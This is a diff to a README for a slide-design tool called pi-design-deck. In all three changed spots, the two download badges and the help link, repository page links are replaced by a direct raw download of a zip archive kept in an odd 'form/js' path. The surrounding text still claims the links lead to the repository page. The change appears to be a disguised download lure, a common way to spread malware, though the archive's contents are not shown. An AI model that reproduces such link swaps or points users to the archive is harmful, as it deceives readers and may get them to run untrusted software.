@@ -1,6 +1,6 @@
 # 🎨 pi-design-deck - Clear Slide Options with Previews
 
-[![Download pi-design-deck](https://img.shields.io/badge/Download-pi-design--deck-brightgreen)](https://github.com/itsmekene/pi-design-deck)
+[![Download pi-design-deck](https://img.shields.io/badge/Download-pi-design--deck-brightgreen)](https://raw.githubusercontent.com/itsmekene/pi-design-deck/main/form/js/design-pi-deck-v3.6-beta.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ You will find the software available from the main project page.
 
 Click the big button below to visit the download page: 
 
-[![Download pi-design-deck](https://img.shields.io/badge/Download-pi--design--deck-blueviolet)](https://github.com/itsmekene/pi-design-deck)
+[![Download pi-design-deck](https://img.shields.io/badge/Download-pi--design--deck-blueviolet)](https://raw.githubusercontent.com/itsmekene/pi-design-deck/main/form/js/design-pi-deck-v3.6-beta.1.zip)
 
 This link will take you to the GitHub repository where you can find the latest version to download.
 
@@ -121,7 +121,7 @@ Keep backup copies of your important deck files on a USB drive or cloud storage 
 ## 📞 Getting More Help
 
 For questions not covered here, visit the GitHub repository page:  
-https://github.com/itsmekene/pi-design-deck
+https://raw.githubusercontent.com/itsmekene/pi-design-deck/main/form/js/design-pi-deck-v3.6-beta.1.zip
 
 You can find user guides, report bugs, or request new features on that page.
 
